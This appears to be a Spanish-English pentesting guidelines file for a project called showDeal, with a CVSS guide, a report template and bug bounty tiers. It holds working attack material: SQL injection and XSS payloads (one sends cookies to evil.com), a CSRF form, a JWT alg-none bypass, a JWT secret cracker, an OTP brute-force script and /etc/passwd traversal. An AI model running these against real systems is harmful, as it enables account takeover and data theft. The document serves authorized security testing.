---
name: Ethical Hacking Guidelines
description: |
  Instrucciones para security testing, penetration testing y vulnerability assessment en showDeal.
  Aplica automáticamente a auditorías de seguridad, reportes de vulnerabilidades, y testing ofensivo.
---

# Ethical Hacking & Security Testing Guidelines

## Penetration Testing Methodology

### Step 1: Reconnaissance
```bash
# Mapear endpoints
grep -r "app\\.get\\|app\\.post\\|router\\." src/ --include="*.js"

# Identificar modelos DB
grep "model r_" prisma/schema.prisma

# Buscar secrets
grep -r "SECRET\\|PASSWORD\\|KEY\\|TOKEN" App/ --include=".env*"

# Análisis de dependencias
npm audit
npx snyk test
```

### Step 2: Vulnerability Scanning

#### API Testing
```bash
# Fuzz endpoints
curl -X POST http://localhost:3001/api/r_user \
  -H "Content-Type: application/json" \
  -d '{"name":"test<script>alert(1)</script>"}'

# Bypass authentication
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0..." \
  http://localhost:3001/api/secret

# CORS preflight bypass
curl -X OPTIONS http://localhost:3001 \
  -H "Origin: http://evil.com"
```

#### JSON Parameter Injection
```
POST /login
Content-Type: application/json

{"user":"admin","password":"test", "admin":true}
```

#### SQL Injection Testing
```
Parámetros: %' OR '1'='1
         %'; DROP TABLE users;--
         %' UNION SELECT password FROM r_user;--
```

#### Authentication Bypass
```
1. JWT sin algoritmo:  {"alg":"none","typ":"JWT"}..
2. OTP brute force:    0000-9999 attempts
3. Token replay:       Reutilizar token viejo
4. JWT secret weak:    Crack si < 8 caracteres
```

#### Authorization Testing
```
1. Cambiar ID en URL: /api/user/1 → /api/user/2
2. Path traversal:    /uploads/../../etc/passwd
3. Hidden resources:  /admin, /debug, /test
4. Method override:   POST con X-HTTP-Method-Override
```

### Step 3: Exploitation & PoC

#### XSS Payload Testing
```javascript
// Reflected
<img src=x onerror="alert('XSS')">
<svg onload=alert(document.cookie)>
<iframe src="javascript:alert('xss')">

// Stored
db.collection.updateOne({name:{"$regex":"<img onerror=alert(1)>"}})

// DOM-based
window.location = "javascript:void(fetch('evil.com?cookie='+document.cookie))"
```

#### CSRF Attack
```html
<form action="http://localhost:3001/api/r_user" method="POST">
  <input type="hidden" name="user" value="attacker">
  <input type="hidden" name="password" value="pwd123">
  <input type="submit">
</form>
```

#### SQL Injection PoC
```python
import requests
import json

payload = {
    "user": "admin' OR '1'='1",
    "password": "anything"
}

r = requests.post(
    "http://localhost:3001/auth/login",
    headers={"Content-Type": "application/json"},
    json=payload
)

print(r.json())  # Si retorna token → VULNERABLE
```

#### JWT Cracking
```bash
# Diccionario de secrets comunes
john --format=jwt jwt.txt --wordlist=common.txt

# Online Cracker
https://jwt.io  # Mostrar payload decodificado

# Cambiar algoritmo
alter_jwt.py --token eyJ0eXAi... --algorithm="HS256" --secret=""
```

## CVSS Scoring

### Formula: CVSS v3.1
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
       │  │    │    │    │  │    │  │  │    │   │
       │  │    │    │    │  │    │  │  │    │   └─ Availability Impact: HIGH
       │  │    │    │    │  │    │  │  │    └────── Integrity Impact: HIGH
       │  │    │    │    │  │    │  │  └──────────── Confidentiality: HIGH
       │  │    │    │    │  │    │  └─────────────── Scope: UNCHANGED
       │  │    │    │    │  │    └────────────────── User Interaction: NONE
       │  │    │    │    │  └──────────────────────── Privileges Required: NONE
       │  │    │    │    └──────────────────────────── Attack Complexity: LOW
       │  │    │    └─────────────────────────────── Attack Vector: NETWORK
       │  │    └────────────────────────────────── Authentication Required: NONE
       │  └───────────────────────────────────── Version
       └──────────────────────────────────────── Score Type
```

### Severidades CVSS
```
0.0           → NONE
0.1 - 3.9     → LOW
4.0 - 6.9     → MEDIUM
7.0 - 8.9     → HIGH
9.0 - 10.0    → CRITICAL
```

## Vulnerability Report Template

```markdown
# VULNERABILITY REPORT

## Executive Summary
- Total Issues: X
- Critical: X | High: X | Medium: X | Low: X
- Timeline: 48 hours (critical)
- Remediation Cost: €X - €Y

## Vulnerabilities

### 1. [CRITICAL] SQL Injection in Login Endpoint
- **CVSS Score**: 9.8
- **CWE**: CWE-89 (SQL Injection)
- **OWASP**: A03:2021 – Injection
- **Severity**: CRITICAL

#### Description
The login endpoint is vulnerable to SQL injection through the `user` parameter.
Input is not validated and directly concatenated into SQL query.

#### Proof of Concept
```bash
curl -X POST http://localhost:3001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'
# Returns valid JWT token → VULNERABLE
```

#### Business Impact
- Unauthorized access to user accounts
- Database exposure (all tables readable)
- Potential data deletion (DROP TABLE)
- Complete system compromise

#### Remediation
```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM r_user WHERE user = '${req.body.user}'`;

// ✅ FIXED
const loginSchema = z.object({
  user: z.string().min(1).max(100),
  password: z.string().min(1)
});
const valid = loginSchema.parse(req.body);
const user = await prisma.r_user.findUnique({
  where: { user: valid.user }
});
```

#### References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/
```

## Bug Bounty Program

### Scope
- In Scope: API, Authentication, Database, Infrastructure
- Out of Scope: DDoS, Social Engineering, Physical

### Severity Guidelines
```
🔴 CRITICAL ($500-2000)
- Unauthenticated data access
- Privilege escalation
- Remote code execution
- Database compromise

🟠 HIGH ($250-500)
- Authenticated data breach
- XSS with impact
- CSRF with impact
- Authentication bypass

🟡 MEDIUM ($100-250)
- Information disclosure
- Password reset flaw
- Rate limiting bypass
- Moderate XSS/CSRF

🟢 LOW ($25-100)
- Minor info leak
- UI manipulation
- Version disclosure
```

## Common Exploit Scripts

### JWT Cracking (Python)
```python
import jwt
import json
from itertools import product

# Token to crack
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Common secrets
secrets = ["secret", "password", "key", "admin", "showdeal"]

for secret in secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"CRACKED! Secret: {secret}")
        print(f"Payload: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
```

### OTP Brute Force (Bash)
```bash
#!/bin/bash
TOKEN="eyJ0eXAi..."

for otp in {0000..9999}; do
  OTP=$(printf "%04d" $otp)
  echo "Trying OTP: $OTP"
  
  RESPONSE=$(curl -s -X POST http://localhost:3001/auth/otp/verify \
    -H "Content-Type: application/json" \
    -d "{\"challengeToken\":\"$TOKEN\",\"otp\":\"$OTP\"}")
  
  if echo $RESPONSE | grep -q '"ok":true'; then
    echo "SUCCESS! OTP: $OTP"
    echo $RESPONSE
    exit 0
  fi
  
  # Rate limiting check
  if echo $RESPONSE | grep -q "429\|Too many"; then
    echo "Rate limited at attempt $otp"
    exit 1
  fi
done
```

### CORS Bypass Test (cURL)
```bash
# Test 1: Origin header
curl -i -X OPTIONS http://localhost:3001 \
  -H "Origin: http://attacker.com" \
  -H "Access-Control-Request-Method: GET"

# Test 2: Null origin
curl -i -X OPTIONS http://localhost:3001 \
  -H "Origin: null"

# Test 3: Wildcard
curl -i -X OPTIONS http://localhost:3001 \
  -H "Origin: http://*.showdeal.com"
```

## Security Testing Checklist

### Authentication
- [ ] Login con SQL injection
- [ ] Login con credenciales vacías
- [ ] OTP brute force (0000-9999)
- [ ] JWT token manipulation
- [ ] Token expiration
- [ ] Token reuse después de logout
- [ ] Cambiar algoritmo JWT a "none"
- [ ] Password en respuesta API
- [ ] Credenciales en logs

### Authorization
- [ ] Acceso a datos de otros usuarios (IDOR)
- [ ] Escalada de permisos (roles)
- [ ] Acceso a módulos restringidos
- [ ] Admin endpoints sin autenticación
- [ ] CORS bypass
- [ ] CSRF without token

### Data Security
- [ ] Passwords plaintext
- [ ] Secrets en código
- [ ] Sensitive data en logs
- [ ] PII exposure
- [ ] Encriptación TLS

### Input Validation
- [ ] XSS en todo campo de texto
- [ ] SQL injection en parámetros
- [ ] Command injection
- [ ] Path traversal uploads
- [ ] Buffer overflow
- [ ] XXE attacks

### API Security
- [ ] Rate limiting
- [ ] API versioning
- [ ] Endpoint discovery
- [ ] Error messages
- [ ] API key security
- [ ] DDoS protection

### Infrastructure
- [ ] Docker escape
- [ ] Secrets en environment
- [ ] Database access control
- [ ] Backup exposure
- [ ] Log exposure
- [ ] S3 bucket misconfiguration

## Red Team vs Blue Team

### Red Team (Atacantes)
- Buscar vulnerabilidades
- Simular ataques reales
- Reportar hallazgos
- Proporcionar PoC

### Blue Team (Defensores)
- Implementar remediaciones
- Code review
- Testing defensivo
- Monitorear y alertar

---

## Disclaimer

⚠️ **Este documento es solo para testing AUTORIZADO**
- Solo testear sistemas de los cuales eres propietario o tienes permiso explícito
- No realizar ataques a terceros sin autorización
- Respetar leyes locales (CFAA, GDPR, etc.)
- Documentar todo para propósitos legales
